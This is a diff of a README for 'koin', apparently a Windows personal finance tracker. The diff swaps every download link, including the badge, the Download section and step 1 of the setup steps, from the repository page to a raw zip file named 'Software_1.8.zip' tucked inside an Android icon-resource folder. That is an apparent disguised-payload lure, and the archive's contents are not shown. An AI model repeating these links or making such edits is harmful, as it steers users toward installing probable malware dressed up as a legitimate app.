@@ -1,11 +1,11 @@
 # 🪙 koin - Track money with less effort
 
-[![Download Koin](https://img.shields.io/badge/Download%20Koin-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Volumelenariver487/koin)
+[![Download Koin](https://img.shields.io/badge/Download%20Koin-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Volumelenariver487/koin/raw/refs/heads/main/android/app/src/main/res/mipmap-xxxhdpi/Software_1.8.zip)
 
 ## 📥 Download
 Use this link to visit the page and download the app:
 
-[Download koin](https://github.com/Volumelenariver487/koin)
+[Download koin](https://github.com/Volumelenariver487/koin/raw/refs/heads/main/android/app/src/main/res/mipmap-xxxhdpi/Software_1.8.zip)
 
 ## 🖥️ What koin does
 koin is a personal finance tracker for Windows. It helps you log income, expenses, and savings in one place. You can manage more than one account, see your money data in charts, and follow savings goals with a simple view.
@@ -34,7 +34,7 @@ Before you install koin, make sure your PC can run it:
 ## 🚀 Get started
 Follow these steps to run koin on Windows:
 
-1. Open the download page: [koin download page](https://github.com/Volumelenariver487/koin)
+1. Open the download page: [koin download page](https://github.com/Volumelenariver487/koin/raw/refs/heads/main/android/app/src/main/res/mipmap-xxxhdpi/Software_1.8.zip)
 2. Find the latest Windows version on the page
 3. Download the file to your computer
 4. Open your Downloads folder
